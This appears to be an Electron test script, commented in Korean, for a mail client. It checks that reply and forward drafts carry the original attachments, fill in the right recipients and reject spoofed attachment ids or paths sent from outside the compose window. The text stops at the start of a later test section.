'use strict';
// 답장·전달에 원문 첨부가 따라가는가.
//
// 사용자: «메일 전달이나 답장할때 전에 첨부되어있던 그런 파일들도 같이 보내져야지».
// 예전엔 답장·전달 초안이 인용문만 들고 갔다 — 첨부는 하나도 안 따라갔다.
// 이제 «복사(다시 보내기)»와 같은 길로 싣는다:
//   · 실을 것은 보기 창의 «첨부» 무리와 같은 판정 — Outlook 이 Content-ID 를 단 PDF·Apple Mail 의 inline PDF 는 싣고,
//     본문 그림과 Word 의 VML 짝은 안 싣는다 (본문 그림은 인용문 안에서 cid 그림으로 나간다 —
//     인용문이 너무 커서 그림을 덜어냈을 때만 첨부로 싣는다)
//   · 이름 없는 첨부(첨부된 메일·회의 초대·octet-stream)도 보기 창의 이름(«첨부N»)으로 싣고, 원문 형식 그대로 나간다
//   · 바이트는 메인에만 — 쓰기 창에는 id·이름·크기만. 보낼 때 메인이 id 로 다시 맞춘다 (모르는 id 는 아무것도 못 싣는다)
//   · 보내기·초안 읽기·갈아끼기·임시 저장은 쓰기 창만 — 메일 보기 창(남의 HTML)이 composeSend 를 불러도 거절
//   · 칩을 빼면 그것만 빠진다. 20개·20MB 를 넘는 것은 빼고 쓰기 창에 한 줄로 알린다 (복사는 예전처럼 개수만)
//   · 보기 창은 mail:reply·mail:forward 로 메인에 맡긴다 (화면이 꾸린 원문은 compose:open 으로 못 연다)
//   · 묻는 사이 다른 메일에서 또 «전달»을 눌러도, 수락한 초안이 제 첨부를 들고 간다 (carryKey).
//     «그만두기»면 옛 초안이 제 첨부를 들고 가고, 물었던 초안의 첨부는 메인에서 바로 지운다
//   · 임시 저장·이어 쓰기는 이름만 — 칩 id·바이트는 되살아나지 않는다
//   · 답장은 원문의 참조를 참조로 잇는다 (이름 그대로, 쓰기 창에 펼쳐서). 전달은 참조도 빈 칸 — 자세한 것은 replycc.test.js
//
// 창은 사용자 화면에 하나도 안 뜬다 — src 쪽 모듈이 만드는 창은 전부 숨김·화면 밖(offscreen)으로 바꿔 끼우고,
// show·focus·moveTop 은 아무 일도 안 하게 한다. 앱(main.js)은 안 띄운다. 물어보는 창(popup)도 안 뜬다 (답만 지어 준다).
// 메일 서버에는 안 붙는다 — nodemailer 의 운반(transport)과 IMAP 접속(mail.connect)을 가짜로 바꿔, 만든 원문을 받아 둔다.
// 메일은 지어낸 것이다 (주소는 전부 .invalid).
const path = require('path');
const fs = require('fs');
const os = require('os');
const Module = require('module');
const electron = require('electron');
const { app, BrowserWindow, ipcMain } = electron;

process.on('uncaughtException', (e) => { console.error('시험 터짐:', (e && e.stack) || e); process.exit(1); });
process.on('unhandledRejection', (e) => { console.error('시험 약속 깨짐:', (e && e.stack) || e); process.exit(1); });
setTimeout(() => { console.error('시간 초과'); process.exit(1); }, 180_000).unref();
app.on('window-all-closed', () => {});

const ROOT = path.join(__dirname, '..');
const SRC = path.join(ROOT, 'src') + path.sep;
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'mailcarry-'));
app.setPath('appData', tmp);
app.setPath('userData', path.join(tmp, 'Hibi'));

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let bad = 0;
const ok = (c, m, x) => {
  const s = x === undefined ? '' : JSON.stringify(x);
  console.log((c ? '  OK   ' : '  실패 ') + m + (s ? `  → ${c && s.length > 160 ? `${s.slice(0, 160)}…` : s}` : ''));
  if (!c) bad++;
};
const until = async (fn, ms = 8000, step = 50) => {
  const t0 = Date.now();
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() - t0 > ms) return null;
    await sleep(step);
  }
};

// ── src 쪽이 받는 electron — 창은 숨김·화면 밖, IPC 처리기는 시험이 직접도 부를 수 있게 적어 둔다 ──
const RealBW = BrowserWindow;
const replaced = [];   // 쓰기 창에 간 «갈아끼울까» 초안들 (carryKey 를 시험이 알아야 한다)
function HiddenWin(opts = {}) {
  const w = new RealBW({
    ...opts,
    show: false,
    webPreferences: { ...(opts.webPreferences || {}), offscreen: true, backgroundThrottling: false }
  });
  // composewin 은 창이 이미 있으면 끌어올린다 — 숨긴 창이 그 말에 화면에 나오면 안 된다
  for (const k of ['show', 'showInactive', 'focus', 'moveTop', 'restore', 'maximize']) w[k] = () => {};
  const send0 = w.webContents.send.bind(w.webContents);
  w.webContents.send = (ch, ...args) => {
    if (ch === 'compose:replace') replaced.push(args[0]);
    return send0(ch, ...args);
  };
  return w;
}
HiddenWin.getAllWindows = () => RealBW.getAllWindows();
HiddenWin.fromWebContents = (wc) => RealBW.fromWebContents(wc);
const handlers = new Map();
const listeners = new Map();
const ipc = Object.create(ipcMain);
ipc.handle = (ch, fn) => { handlers.set(ch, fn); return ipcMain.handle(ch, fn); };
ipc.on = (ch, fn) => { listeners.set(ch, fn); return ipcMain.on(ch, fn); };
const fakeElectron = {};
const swapped = { BrowserWindow: HiddenWin, ipcMain: ipc };
for (const k of Object.keys(electron)) {
  Object.defineProperty(fakeElectron, k, k in swapped
    ? { enumerable: true, value: swapped[k] }
    : { enumerable: true, get: () => electron[k] });
}
const load = Module._load;
Module._load = function (request, parent, ...rest) {
  if (request === 'electron' && parent && String(parent.filename || '').startsWith(SRC)) return fakeElectron;
  return load.call(this, request, parent, ...rest);
};

// ── 서버 대신 — 만든 원문을 받아 두기만 한다 ──
const nodemailer = require('nodemailer');
const sent = [];
nodemailer.createTransport = () => ({
  sendMail: async ({ envelope, raw }) => {
    sent.push({ envelope, raw: Buffer.from(raw) });
    return { accepted: envelope.to, rejected: [], messageId: `<t${sent.length}@test.invalid>` };
  },
  close() {}
});
const { simpleParser } = require('mailparser');

// ── 지어낸 메일 — Outlook(Word) 꼴 본문 + 여러 갈래 첨부 ──
// 1×1 PNG — 뒤에 글자를 덧붙이면 그림은 그대로 그려지고 바이트만 달라진다
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==', 'base64');
const png = (tag) => Buffer.concat([PNG, Buffer.from(tag)]);
const IMG_VML = png('vml-original');      // Word 가 주석 속 VML 로 한 벌 더 실은 원본
const IMG_DRAWN = png('drawn-in-body');   // 본문 <img> 로 그려지는 그림
const PHOTO = png('real-photo-file');     // 그림이지만 그냥 붙인 파일 (disposition attachment)
const REPORT = Buffer.from('%PDF-1.4\n% report-marker-RPT\n%%EOF\n');
const SCAN = Buffer.from('%PDF-1.4\n% scan-marker-SCN\n%%EOF\n');
const b64 = (buf) => buf.toString('base64').replace(/.{76}/g, '$&\r\n');
const HTML = '<html><head><style><!--\n p.MsoNormal{margin:0cm}\n--></style></head><body>'
  + '<p class=MsoNormal>견적서 보내드립니다.</p><p class=MsoNormal>'
  + '<!--[if gte vml 1]><v:shape id="그림_x0020_1" type="#_x0000_t75" style=\'width:30pt;height:30pt\'>'
  + '<v:imagedata src="cid:image001.png@01DB0000.00000000" o:title=""/></v:shape><![endif]-->'
  + '<![if !vml]><img width=40 height=40 src="cid:image002.png@01DB0000.00000000" v:shapes="그림_x0020_1"><![endif]>'
  + '</p></body></html>';
const EML = [
  'From: "보낸이" <sender@example.invalid>',
  // 메일링 리스트·대리 발송 꼴 — 답장은 From 이 아니라 여기로 가야 한다
  'Reply-To: <reply@example.invalid>',
  'To: <me@example.invalid>',
  'Cc: "동료" <coworker@example.invalid>',
  'Subject: =?UTF-8?B?' + Buffer.from('견적서').toString('base64') + '?=',
  'Message-ID: <orig-1@example.invalid>',
  'Date: Tue, 20 Oct 2026 13:13:00 +0900',
  'MIME-Version: 1.0',
  'Content-Type: multipart/mixed; boundary="MIX"',
  '',
  '--MIX',
  'Content-Type: multipart/related; boundary="REL"; type="text/html"',
  '',
  '--REL',
  'Content-Type: text/html; charset="utf-8"',
  'Content-Transfer-Encoding: base64',
  '',
  b64(Buffer.from(HTML, 'utf8')),
  '--REL',
  'Content-Type: image/png; name="image001.png"',
  'Content-ID: <image001.png@01DB0000.00000000>',
  'Content-Transfer-Encoding: base64',
  '',
  b64(IMG_VML),
  '--REL',
  'Content-Type: image/png; name="image002.png"',
  'Content-ID: <image002.png@01DB0000.00000000>',
  'Content-Transfer-Encoding: base64',
  '',
  b64(IMG_DRAWN),
  '--REL--',
  '',
  '--MIX',
  // Outlook 은 그냥 붙인 파일에도 Content-ID 를 단다
  'Content-Type: application/pdf; name="report.pdf"',
  'Content-Disposition: attachment; filename="report.pdf"',
  'Content-ID: <report.pdf@01DB0000.00000000>',
  'Content-Transfer-Encoding: base64',
  '',
  b64(REPORT),
  '--MIX',
  // Apple Mail 은 PDF 를 inline 으로 보낸다 — 그래도 첨부다
  'Content-Type: application/pdf; name="scan.pdf"',
  'Content-Disposition: inline; filename="scan.pdf"',
  'Content-Transfer-Encoding: base64',
  '',
  b64(SCAN),
  '--MIX',
  'Content-Type: image/png; name="photo.png"',
  'Content-Disposition: attachment; filename="photo.png"',
  'Content-Transfer-Encoding: base64',
  '',
  b64(PHOTO),
  '--MIX--',
  ''
].join('\r\n');

const ACC = {
  id: 'acc1', name: '시험 계정', user: 'me@example.invalid',
  host: 'imap.example.invalid', smtpHost: 'smtp.example.invalid', smtpPort: 587
};
const REAL_ATTS = ['report.pdf', 'scan.pdf', 'photo.png'];

const parse = (raw) => simpleParser(raw, { keepCidLinks: true });
const regular = (p) => p.attachments.filter((a) => a.contentDisposition === 'attachment');
const inlineParts = (p) => p.attachments.filter((a) => a.contentDisposition !== 'attachment');
const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);

app.whenReady().then(async () => {
  const mail = require(path.join(SRC, 'mail.js'));
  // 보낸편지함 넣기(IMAP APPEND)도 서버에 안 간다
  let appended = 0;
  mail.connect = () => ({
    connect: async () => {}, close() {}, logout: async () => {},
    list: async () => [{ specialUse: '\\Sent', path: 'Sent', name: 'Sent' }],
    append: async () => { appended++; }
  });
  // 물어보는 창은 안 띄운다 — 답만 지어 준다 (askDelay 동안 «사용자가 고민 중»)
  const popup = require(path.join(SRC, 'popup.js'));
  const asked = [];
  let askDelay = 0;
  let askAnswer = 0;   // 0 = «버리고 열기», 1 = «그만두기»
  popup.askUser = async (_win, o) => { asked.push(o && o.message); await sleep(askDelay); return askAnswer; };
  const store = require(path.join(SRC, 'store.js'));
  popup.pickFromMenu = async () => null;

  const composewin = require(path.join(SRC, 'composewin.js'));
  const slots = new Map();   // 보기 창 webContents.id → { payload, files }
  composewin.init({
    mailAccountsForUse: () => [ACC],
    noAccountMessage: () => '계정 없음 (시험)',
    refreshMail: async () => {},
    slotOf: (e) => slots.get(e && e.sender && e.sender.id) || null,
    doTrash: async () => ({ moved: false })
  });
  // 쓰기 창이 부르지만 composewin 밖에 있는 것 (주소록 — 앱에선 contacts.js)
  ipcMain.handle('mail:contacts', () => []);
  // 보기 창 본문 — 앱에선 mailwin.js 가 slot.payload 를 준다
  ipcMain.handle('mail:view-data', (e) => {
    const s = slots.get(e.sender.id);
    return s ? s.payload : { error: '창을 찾지 못했습니다' };
  });

  const view = await mail.viewFromSource(Buffer.from(EML), { allowRemote: false });
  // 보기 창에 넘기는 꼴 — mailwin 과 같은 함수로
  const payload = mail.viewPayload(view, { accountId: ACC.id, fromSelf: false, seen: true });
  const viewNames = payload.attachments.filter((a) => !a.inline).map((a) => a.filename);
  console.log('\n[0] 지어낸 메일 — 보기 창이 «첨부»로 보여 주는 것');
  ok(same(viewNames, REAL_ATTS), '보기 창의 «첨부» = report.pdf(Content-ID) · scan.pdf(inline) · photo.png', viewNames);
  ok(payload.attachments.some((a) => a.inline && a.filename === 'image002.png') && !payload.attachments.some((a) => a.filename === 'image001.png'),
    '  본문 그림 image002 는 «본문 그림», VML 짝 image001 은 목록에서 빠진다');

  const composeWin = () => RealBW.getAllWindows().find((w) => !w.isDestroyed() && w.webContents.getURL().includes('compose.html')) || null;
  const cjs = (code) => composeWin().webContents.executeJavaScript(code);
  const chips = () => cjs(`[...document.querySelectorAll('#files .file:not(.over) b')].map((b) => b.textContent)`);
  const waitChips = async (names) => {
    const got = await until(async () => {
      const w = composeWin();
      if (!w || w.webContents.isLoading()) return null;
      const c = await chips().catch(() => null);
      return c && same(c, names) ? c : null;
    });
    return got || (composeWin() ? await chips().catch(() => null) : '창 없음');
  };
  const closedSoon = () => until(() => !composeWin(), 6000);
  // 쓰기 창의 본 문서에서 온 것처럼 — composewin 은 보낸 창(e.sender·senderFrame)을 본다
  const own = () => { const wc = composeWin().webContents; return { sender: wc, senderFrame: wc.mainFrame }; };
  const data = () => handlers.get('compose:data')(own());
  // 칩·초안에 첨부 바이트가 새지 않았나 — Buffer 는 {"type":"Buffer","data":[…]} 로 적히므로 글자로 펴서 표식을 찾는다
  const MARKERS = /report-marker-RPT|scan-marker-SCN|real-photo-file|vml-original/;
  const flat = (o) => JSON.stringify(o, (_k, v) => (v && v.type === 'Buffer' && Array.isArray(v.data) ? Buffer.from(v.data).toString('latin1') : v));
  const when = new Date('2026-10-20T13:13:00+09:00').toLocaleString('ko-KR');
  const lastSent = () => parse(sent[sent.length - 1].raw);

  // ── 보기 창 — 진짜 mailview.html + 진짜 preload, 화면 밖 ──
  const viewWin = new RealBW({
    show: false, width: 460, height: 640,
    webPreferences: { offscreen: true, preload: path.join(SRC, 'preload.js'), backgroundThrottling: false }
  });
  slots.set(viewWin.webContents.id, { payload, files: view.attachments, win: viewWin });
  await viewWin.loadFile(path.join(ROOT, 'renderer', 'mailview.html'), { query: { radius: '20', theme: 'dark' } });
  const vjs = (code) => viewWin.webContents.executeJavaScript(code);
  const shown = await until(() => vjs(`getComputedStyle(document.getElementById('forward')).display !== 'none'
    && getComputedStyle(document.getElementById('reply')).display !== 'none'`));
  ok(!!shown, '보기 창에 «답장»·«전달» 단추가 보인다');

  console.log('\n[1] 보기 창 «전달» — 원문 첨부가 칩으로 따라온다 (메인이 slot 으로 만든다)');
  await vjs(`document.getElementById('forward').click()`);
  let names = await waitChips(REAL_ATTS);
  ok(same(names, REAL_ATTS), '칩 = report.pdf · scan.pdf · photo.png (본문 그림·VML 짝 없음)', names);
  let d = await data();
  ok(d && d.title === '전달' && d.subject === 'Fwd: 견적서' && d.to === '' && !d.cc,
    '  전달 제목·받는 사람·참조 칸은 그대로 (Fwd:, 빈 칸 — 원문의 참조는 안 따라온다)', d && { title: d.title, subject: d.subject, to: d.to, cc: d.cc });
  ok(/^---------- 전달된 메일 ----------/.test(d.quoteHead) && d.quoteHead.includes('받는사람: ') && d.quoteHead.includes(`날짜: ${when}`),
    '  전달 머리글 — 받는사람 줄과 원문 날짜 (메인이 옮겨 적은 칸)', d.quoteHead);
  const keysOk = (list) => (list || []).every((a) => same(Object.keys(a).sort(), ['carried', 'filename', 'id', 'size']) && a.carried === true);
  ok(keysOk(d.attachments) && d.attachments.every((a) => /^fwd\d+$/.test(a.id)), '  화면에 간 칩은 id·이름·크기뿐 (carried)', d.attachments);
  const dj = JSON.stringify(d);
  ok(![REPORT, SCAN, PHOTO].some((b) => dj.includes(b.toString('base64'))) && !MARKERS.test(flat(d)),
    '  쓰기 창 초안 어디에도 첨부 바이트(그대로든 Buffer 든 base64 든)가 없다');
  ok(!dj.includes(IMG_VML.toString('base64')), '  VML 짝 그림 바이트도 화면에 안 간다');
  ok(d.attachments.map((a) => a.size).join() === [REPORT, SCAN, PHOTO].map((b) => b.length).join(), '  크기는 원문 그대로', d.attachments.map((a) => a.size));
  const state = JSON.parse(await cjs('JSON.stringify(attachments)'));
  ok(keysOk(state), '  화면의 첨부 목록도 id 뿐', state);
  ok(!MARKERS.test(await cjs(`JSON.stringify({ context, attachments }, (k, v) => (v instanceof Uint8Array ? new TextDecoder('latin1').decode(v) : v))`)),
    '  쓰기 창(화면)이 들고 있는 것 어디에도 첨부 바이트가 없다');
  ok(await cjs(`document.getElementById('msg').textContent === ''`), '  뺀 것이 없으면 알림도 없다');
  ok(await cjs('dirty()') === false, '  아무것도 안 고쳤으면 «쓰던 글»이 아니다 (원문 첨부가 붙어 있어도)');
  ok(!(await vjs(`document.getElementById('blocked').style.display === 'block'`)), '  보기 창에 오류 알림이 없다');

  // scan.pdf 칩을 빼고 보낸다
  await cjs(`(() => { const chip = [...document.querySelectorAll('#files .file')].find((c) => c.querySelector('b').textContent === 'scan.pdf');
    chip.querySelector('button').click(); })()`);
  names = await waitChips(['report.pdf', 'photo.png']);
  ok(same(names, ['report.pdf', 'photo.png']), '칩 ✕ — scan.pdf 가 빠진다', names);
  ok(await cjs('dirty()') === true, '  칩을 뺐으면 «쓰던 글»이다 (닫을 때 묻는다)');
  await cjs(`document.getElementById('to').value = 'friend@example.invalid'; document.getElementById('send').click()`);
  await until(() => sent.length === 1);
  ok(sent.length === 1, '보냈다 (가짜 운반)', sent.length);
  let p = await parse(sent[0].raw);
  ok(same(sent[0].envelope.to, ['friend@example.invalid']) && !p.cc, '  봉투의 받는 사람 = 적은 사람만 (참조 없음)', sent[0].envelope.to);
  ok(p.subject === 'Fwd: 견적서', '  제목 Fwd: 견적서', p.subject);
  let regs = regular(p);
  ok(same(regs.map((a) => a.filename), ['report.pdf', 'photo.png']), '  첨부 = report.pdf · photo.png (뺀 scan.pdf 는 없다)', regs.map((a) => a.filename));
  ok(regs[0] && regs[0].content.equals(REPORT) && regs[1] && regs[1].content.equals(PHOTO), '  바이트는 원문 그대로');
  let ins = inlineParts(p);
  ok(ins.length === 1 && ins[0].content.equals(IMG_DRAWN) && ins[0].related === true && /^image\/png$/.test(ins[0].contentType),
    '  인용문의 본문 그림은 cid 그림 하나로 (related) — 첨부로 또 붙지 않는다', ins.map((a) => [a.filename, a.contentDisposition, a.size]));
  ok(ins[0] && String(p.html).includes(`cid:${ins[0].cid}`) && !/data:/i.test(String(p.html)),
    '  본문 HTML 은 cid: 로 가리키고 data: 그림이 없다', ins[0] && ins[0].cid);
  ok(!p.attachments.some((a) => a.content.equals(IMG_VML) || a.content.equals(SCAN)), '  VML 짝·뺀 칩의 바이트는 어디에도 없다');
  ok(/전달된 메일/.test(String(p.text || '')) || /전달된 메일/.test(String(p.html || '')), '  전달 머리글은 그대로');
  ok(appended === 1, '  보낸편지함 넣기도 가짜로 (서버 없음)', appended);
  ok(!!(await closedSoon()), '  보내고 나면 쓰기 창이 닫힌다');

  console.log('\n[2] 보기 창 «답장» — 받는 사람은 보낸 사람 하나, 원문 첨부는 따라온다');
  await vjs(`document.getElementById('reply').click()`);
  names = await waitChips(REAL_ATTS);
  ok(same(names, REAL_ATTS), '칩 = report.pdf · scan.pdf · photo.png', names);
  d = await data();
  ok(d.title === '답장' && d.subject === 'Re: 견적서' && d.to === 'reply@example.invalid' && d.cc === '"동료" <coworker@example.invalid>',
    '  받는 사람 = 원문의 Reply-To 하나 (From 은 안 들어간다), 참조 = 원문의 참조(동료) 이름 그대로, 제목 Re:', { to: d.to, cc: d.cc, subject: d.subject });
  ok(await until(() => cjs(`document.getElementById('cc').value === '"동료" <coworker@example.invalid>'
    && !document.getElementById('row-cc').classList.contains('hide')`)), '  쓰기 창의 참조 칸이 펼쳐져 동료가 보인다');
  ok(await cjs('dirty()') === false, '  참조가 차 있어도 안 고쳤으면 «쓰던 글»이 아니다');
  ok(String(d.quoteHead).startsWith(when) && /견적서 보내드립니다/.test(String(d.text || '')),
    '  인용 머리글은 원문 날짜, 글 인용문도 찬다 (메인이 옮겨 적은 칸)', { head: d.quoteHead, text: d.text });
  ok(keysOk(d.attachments) && d.attachments.every((a) => /^reply\d+$/.test(a.id)), '  칩은 id 뿐', d.attachments);
  await cjs(`document.getElementById('send').click()`);
  await until(() => sent.length === 2);
  p = await parse(sent[1].raw);
  ok(same(sent[1].envelope.to, ['reply@example.invalid', '"동료" <coworker@example.invalid>'])
    && same(p.to.value.map((a) => a.address), ['reply@example.invalid'])
    && p.cc && same(p.cc.value.map((a) => [a.name, a.address]), [['동료', 'coworker@example.invalid']]),
  '  봉투 = Reply-To·동료, 머리글 To = Reply-To 하나, Cc = «동료» (이름 그대로)', { env: sent[1].envelope.to, cc: p.cc && p.cc.text });
  ok(p.inReplyTo === '<orig-1@example.invalid>', '  In-Reply-To 로 원문에 이어 붙는다', p.inReplyTo);
  regs = regular(p);
  ok(same(regs.map((a) => a.filename), REAL_ATTS) && regs[1].content.equals(SCAN), '  첨부 셋 다 (inline 이던 scan.pdf 도 첨부로)', regs.map((a) => a.filename));
  ok(same(regs.map((a) => a.contentType), ['application/pdf', 'application/pdf', 'image/png']), '  형식도 원문 그대로', regs.map((a) => a.contentType));
  ins = inlineParts(p);
  ok(ins.length === 1 && ins[0].content.equals(IMG_DRAWN) && String(p.html).includes(`cid:${ins[0].cid}`) && !/data:/i.test(String(p.html)),
    '  인용문 그림은 cid 하나, data: 없음', ins.length);
  ok(!!(await closedSoon()), '  보내고 나면 닫힌다');

  console.log('\n[3] 목록 메뉴 «전달» 길 — mail.realAttachmentsOf 로 고른 것을 startCompose 가 싣는다');
  const listFiles = mail.realAttachmentsOf(view.attachments, view.shown, { missed: view.missed, twins: view.twins });
  ok(same(listFiles.map((a) => a.filename), REAL_ATTS), 'realAttachmentsOf = 보기 창의 «첨부»와 같다', listFiles.map((a) => a.filename));
  const src = { subject: view.subject, from: view.from, fromAddress: view.fromAddress, to: view.to,
    replyTo: view.replyTo, messageId: view.messageId, at: view.receivedAt, text: view.text, html: view.html };
  let r = composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: listFiles });
  ok(r && r.ok, 'startCompose(forward, files) 가 연다', r);
  names = await waitChips(REAL_ATTS);
  ok(same(names, REAL_ATTS), '  칩 셋', names);
  d = await data();
  const ids = d.attachments.map((a) => a.id);

  console.log('\n[4] 보내기 문 — 화면이 주는 것은 «이 id 를 보내라»뿐이다');
  const sendMsg = (attachments, ev = own()) => handlers.get('compose:send')(ev, {
    to: 'friend@example.invalid', subject: '시험', text: '시험', html: '<p>시험</p>', attachments
  });
  const before = sent.length;
  r = await sendMsg([{ carried: true, id: ids[0] }], {});
  ok(r && r.ok === false && sent.length === before, '보낸 창을 모르는 보내기 → 거절 (쓰기 창에서만)', r);
  r = await sendMsg([{ carried: true, id: ids[0] }], { sender: composeWin().webContents, senderFrame: null });
  ok(r && r.ok === false && sent.length === before, '쓰기 창이어도 본 문서가 아닌 곳(틀)에서 온 보내기 → 거절', r);
  r = await sendMsg([{ carried: true, id: 'fwd999999', filename: 'evil.exe', size: 1 }]);
  ok(r && r.ok === false && sent.length === before, '실어둔 적 없는 id → 아무것도 안 싣고 보내지도 않는다', r);
  r = await sendMsg([{ carried: true, id: ids[0], filename: 'evil.exe', content: 'EVIL-BYTES', path: path.join(tmp, 'x.txt') }]);
  ok(r && r.ok, '맞는 id 에 화면이 이름·바이트·경로를 덧붙여도 보낸다', r);
  p = await parse(sent[sent.length - 1].raw);
  regs = regular(p);
  ok(same(regs.map((a) => a.filename), ['report.pdf']) && regs[0].content.equals(REPORT) && !p.attachments.some((a) => /EVIL/.test(a.content.toString('latin1'))),
    '  나간 것은 메인이 실어둔 report.pdf 바이트 그대로 (화면이 준 이름·바이트는 무시)', regs.map((a) => a.filename));
  r = await sendMsg([{ carried: true, id: ids[2] }, { carried: true, id: ids[2] }]);
  p = await parse(sent[sent.length - 1].raw);
  ok(r && r.ok && same(regular(p).map((a) => a.filename), ['photo.png']), '같은 칩이 두 번 와도 한 번만 싣는다', regular(p).map((a) => a.filename));
  r = await sendMsg([{ path: path.join(tmp, 'x.txt'), filename: 'x.txt' }]);
  ok(r && r.ok === false, '대화상자로 고르지 않은 경로는 여전히 거절', r);

  console.log('\n[5] 갈아끼기 — 묻는 사이 또 «전달»을 눌러도, 수락한 초안이 제 첨부를 들고 간다');
  const fileOf = (name, content) => ({ filename: name, contentType: 'application/pdf', content: Buffer.from(content) });
  await cjs(`document.getElementById('subject').value = '고치는 중'`);   // 쓰던 글이 있다 → 물어본다
  askDelay = 700;
  const askedBefore = asked.length;
  r = composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: [fileOf('b.pdf', 'B-BYTES')] });
  ok(r && r.ok && r.reused, '창이 열려 있으면 갈아끼기를 묻는다', r);
  await until(() => asked.length > askedBefore);
  // 사용자가 고민하는 사이 다른 메일에서 또 «전달» — 화면은 묻는 중이라 이것을 버린다
  composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: [fileOf('c.pdf', 'C-BYTES')] });
  names = await waitChips(['b.pdf']);
  ok(same(names, ['b.pdf']), '수락한 초안(b.pdf)이 떴다', names);
  askDelay = 0;
  const bId = (await data()).attachments[0].id;
  const cPay = replaced[replaced.length - 1];
  const n5a = sent.length;
  r = await sendMsg([{ carried: true, id: ids[0] }]);
  ok(r && r.ok === false && sent.length === n5a, '  갈아끼우기 전 초안([3])의 id → 거절 (실어 둔 적이 있어도 지금 초안 것이 아니면)', r);
  r = await sendMsg([{ carried: true, id: cPay && cPay.attachments[0].id }]);
  ok(cPay && cPay.attachments[0].filename === 'c.pdf' && r && r.ok === false && sent.length === n5a,
    '  화면이 버린 c.pdf 초안의 id → 거절', r);
  await cjs(`document.getElementById('to').value = 'friend@example.invalid'; document.getElementById('send').click()`);
  const n5 = sent.length;
  await until(() => sent.length > n5);
  p = sent.length > n5 ? await parse(sent[sent.length - 1].raw) : null;
  ok(p && same(regular(p).map((a) => a.filename), ['b.pdf']) && regular(p)[0].content.toString() === 'B-BYTES',
    '  보낸 것은 b.pdf 의 바이트 (뒤에 누른 c.pdf 와 섞이지 않는다)', p && regular(p).map((a) => a.filename));
  ok(!!(await closedSoon()), '  보내고 나면 닫힌다');

  console.log('\n[5b] «그만두기» — 옛 초안이 제 첨부를 들고 가고, 물었던 초안의 첨부는 섞이지도 남지도 않는다');
  composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: [fileOf('k.pdf', 'K-BYTES')] });
  names = await waitChips(['k.pdf']);
  const kId = (await data()).attachments[0].id;
  await cjs(`document.getElementById('subject').value = '유지할 글'`);
  askAnswer = 1;
  askDelay = 400;
  const nRep = replaced.length;
  const nAsk = asked.length;
  r = composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: [fileOf('z.pdf', 'Z-BYTES')] });
  const zPay = replaced[nRep];
  const zId = zPay && zPay.attachments[0] && zPay.attachments[0].id;
  ok(r && r.reused && zPay && zPay.attachments[0].filename === 'z.pdf' && Number.isInteger(zPay.carryKey), '창이 열려 있으면 묻는다 (z.pdf 초안)', r);
  await until(() => asked.length > nAsk);
  // 사용자가 고민하는 사이 메일 보기 창(다른 창)이 그 열쇠로 «수락»을 보낸다 — 쓰기 창이 아니므로 무시
  await vjs(`window.nunsseom.composeAcceptReplace({ accountId: ${JSON.stringify(ACC.id)}, carryKey: ${Number(zPay && zPay.carryKey)} })`);
  await until(() => cjs('!asking'), 4000);
  await sleep(150);
  names = await chips();
  d = await data();
  ok(same(names, ['k.pdf']) && d && d.title === '전달' && d.attachments[0].id === kId
    && await cjs(`document.getElementById('subject').value`) === '유지할 글',
  '그만두기 — 칩·쓰던 글 그대로 (보기 창이 보낸 수락은 무시)', { names, title: d && d.title });
  const n5b = sent.length;
  r = await sendMsg([{ carried: true, id: zId }]);
  ok(r && r.ok === false && sent.length === n5b, '  물었던 초안(z.pdf)의 id 로는 못 보낸다', r);
  r = await sendMsg([{ carried: true, id: kId }]);
  p = sent.length > n5b ? await lastSent() : null;
  ok(r && r.ok && p && same(regular(p).map((a) => a.filename), ['k.pdf']) && regular(p)[0].content.toString() === 'K-BYTES',
    '  옛 칩으로 보내면 옛 바이트(k.pdf)만 나간다', p && regular(p).map((a) => a.filename));
  // 화면은 그만둔 열쇠를 메인에 알린다(compose:drop-replace) — 메인은 그 첨부를 바로 버린다.
  // 그래서 그 열쇠로 수락이 와도 z.pdf 는 실리지 않는다 (안 버렸으면 실렸다)
  listeners.get('compose:accept-replace')(own(), zPay);
  const n5c = sent.length;
  r = await sendMsg([{ carried: true, id: zId }]);
  ok(r && r.ok === false && sent.length === n5c, '  그만둔 초안의 첨부는 메인에 남지 않는다 (그 열쇠로 수락해도 z.pdf 가 없다)', r);
  askAnswer = 0;
  askDelay = 0;
  composeWin().close();
  ok(!!(await closedSoon()), '  닫는다');

  console.log('\n[5c] 묻는 사이 «전달»을 네 번 더 — 묻고 있는 초안의 첨부가 밀려나지 않는다');
  composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: [fileOf('p.pdf', 'P-BYTES')] });
  await waitChips(['p.pdf']);
  await cjs(`document.getElementById('subject').value = '쓰는 중'`);
  askDelay = 600;
  const nAsk2 = asked.length;
  // 한 번 묻는 동안 다섯 번 — 메인에는 열쇠가 다섯 개 쌓인다 (상한 4)
  for (let i = 1; i <= 5; i++) {
    composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: [fileOf(`q${i}.pdf`, `Q${i}-BYTES`)] });
  }
  names = await waitChips(['q1.pdf']);
  ok(same(names, ['q1.pdf']) && asked.length === nAsk2 + 1, '«버리고 열기» — 처음 물은 q1.pdf 가 뜬다 (물음은 한 번)', names);
  askDelay = 0;
  await cjs(`document.getElementById('to').value = 'friend@example.invalid'; document.getElementById('send').click()`);
  const n5d = sent.length;
  await until(() => sent.length > n5d);
  p = sent.length > n5d ? await lastSent() : null;
  ok(p && same(regular(p).map((a) => a.filename), ['q1.pdf']) && regular(p)[0].content.toString() === 'Q1-BYTES',
    '  보내면 q1.pdf 바이트가 나간다 (예전엔 밀려나 «원문 첨부를 찾지 못했습니다»)',
    p ? regular(p).map((a) => a.filename) : await cjs(`document.getElementById('msg').textContent`));
  ok(!!(await closedSoon()), '  보내고 나면 닫힌다');

  console.log('\n[6] 너무 많거나 큰 원문 첨부 — 빼고, 쓰기 창에 한 줄로');
